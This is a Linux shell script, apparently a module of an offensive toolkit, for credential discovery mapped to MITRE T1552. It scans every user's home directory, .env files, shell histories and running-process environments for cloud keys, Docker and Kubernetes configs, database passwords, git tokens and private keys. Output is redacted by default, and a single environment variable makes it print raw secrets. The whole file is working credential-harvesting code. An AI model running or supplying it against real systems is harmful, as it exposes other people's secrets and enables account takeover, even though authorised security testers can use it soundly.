#!/bin/sh
# gather/linux/enum-credentials.sh — Harvest credentials from common locations
# Requires: read access to user home directories and /etc
# Read-only: YES
# Sensitive-output: YES — redacted by default; set BRJOTSKEL_REVEAL_SECRETS=1 to print raw material
# MITRE ATT&CK: T1552 — Unsecured Credentials

set -u
REVEAL_SECRETS="${BRJOTSKEL_REVEAL_SECRETS:-0}"
redact_stream() {
  if [ "$REVEAL_SECRETS" = "1" ]; then
    cat
  else
    sed -E \
      -e 's/(aws_secret_access_key[[:space:]]*=[[:space:]]*)[^[:space:]]+/\1<redacted>/Ig' \
      -e 's/(aws_session_token[[:space:]]*=[[:space:]]*)[^[:space:]]+/\1<redacted>/Ig' \
      -e 's/(token[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/Ig' \
      -e 's/(secret[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/Ig' \
      -e 's/(password[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/Ig' \
      -e 's#(https?://[^:/]+:)[^@]+@#\1<redacted>@#Ig' \
      -e 's/-----BEGIN [^-]*PRIVATE KEY-----/<private key block redacted; set BRJOTSKEL_REVEAL_SECRETS=1>/Ig' \
      -e 's/-----END [^-]*PRIVATE KEY-----/<private key block redacted end>/Ig'
  fi
}
show_secret_file() {
  f="$1"
  if [ "$REVEAL_SECRETS" = "1" ]; then
    cat "$f" 2>/dev/null
  elif grep -q 'BEGIN .*PRIVATE KEY' "$f" 2>/dev/null; then
    printf '[REDACTED] %s private key content hidden; set BRJOTSKEL_REVEAL_SECRETS=1 to reveal\n' "$f"
  else
    printf '[REDACTED] %s present; raw values hidden\n' "$f"
    cat "$f" 2>/dev/null | redact_stream
  fi
}

echo "=== CREDENTIAL COLLECTION MODE ==="
printf 'Secret output: %s\n\n' "$([ "$REVEAL_SECRETS" = "1" ] && echo 'REVEAL enabled' || echo 'REDACTED; set BRJOTSKEL_REVEAL_SECRETS=1 to reveal raw values')"

echo "=== AWS CREDENTIALS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  for f in .aws/credentials .aws/config .s3cfg .boto; do
    [ -f "$d/$f" ] || continue
    echo "--- $d/$f ---"
    show_secret_file "$d/$f"
  done
done

echo ""
echo "=== GCP / AZURE ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  # GCP service account keys
  if [ -d "$d/.config/gcloud" ]; then
    echo "--- $d/.config/gcloud ---"
    find "$d/.config/gcloud" -name "*.json" 2>/dev/null | while IFS= read -r gcp_json; do
      echo "  $gcp_json"
      show_secret_file "$gcp_json"
    done
  fi
  # Azure CLI
  [ -f "$d/.azure/accessTokens.json" ] && echo "--- $d/.azure/accessTokens.json ---" && show_secret_file "$d/.azure/accessTokens.json"
  [ -f "$d/.azure/azureProfile.json" ] && echo "--- $d/.azure/azureProfile.json ---" && show_secret_file "$d/.azure/azureProfile.json"
done

echo ""
echo "=== DOCKER CREDENTIALS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.docker/config.json" ] || continue
  echo "--- $d/.docker/config.json ---"
  show_secret_file "$d/.docker/config.json"
done

echo ""
echo "=== KUBERNETES ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.kube/config" ] || continue
  echo "--- $d/.kube/config ---"
  show_secret_file "$d/.kube/config"
done

echo ""
echo "=== NETRC / PGPASS / MY.CNF ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.netrc" ] && echo "--- $d/.netrc ---" && show_secret_file "$d/.netrc"
  [ -f "$d/.pgpass" ] && echo "--- $d/.pgpass ---" && show_secret_file "$d/.pgpass"
  [ -f "$d/.my.cnf" ] && echo "--- $d/.my.cnf ---" && show_secret_file "$d/.my.cnf"
done

echo ""
echo "=== GIT CREDENTIALS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.git-credentials" ] && echo "--- $d/.git-credentials ---" && show_secret_file "$d/.git-credentials"
  [ -f "$d/.gitconfig" ] && grep -i "credential\|token\|password" "$d/.gitconfig" 2>/dev/null | redact_stream && echo "--- $d/.gitconfig (filtered) ---"
done

echo ""
echo "=== ENVIRONMENT FILES ==="
cat /etc/environment 2>/dev/null | grep -iE "key|secret|token|pass|cred" | redact_stream && echo "--- /etc/environment (filtered) ---"
find / -maxdepth 3 -name ".env" -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | while IFS= read -r f; do
  echo "--- $f ---"
  show_secret_file "$f"
done

echo ""
echo "=== HISTORY FILES (last 30 lines with secrets) ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  for f in .bash_history .zsh_history .sh_history; do
    [ -f "$d/$f" ] || continue
    hits=$(grep -inE "pass|secret|token|key|curl.*-u|wget.*--password|mysql.*-p|sshpass" "$d/$f" 2>/dev/null | tail -30)
    [ -n "$hits" ] && echo "--- $d/$f (secrets) ---" && printf '%s\n' "$hits" | redact_stream
  done
done

echo ""
echo "=== VAULT / GNOME KEYRING ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -d "$d/.local/share/keyrings" ] && echo "--- $d keyrings ---" && ls -la "$d/.local/share/keyrings/" 2>/dev/null
done

echo ""
echo "=== PROCESS ENVIRONMENT (secrets in running procs) ==="
find /proc/*/environ -readable 2>/dev/null | while IFS= read -r f; do
  pid=$(echo "$f" | cut -d/ -f3)
  content=$(tr '\0' '\n' < "$f" 2>/dev/null | grep -iE "pass|secret|token|key|api" | grep -v "^PATH=")
  [ -n "$content" ] && echo "--- PID $pid ($(cat /proc/$pid/comm 2>/dev/null)) ---" && printf '%s\n' "$content" | redact_stream
done
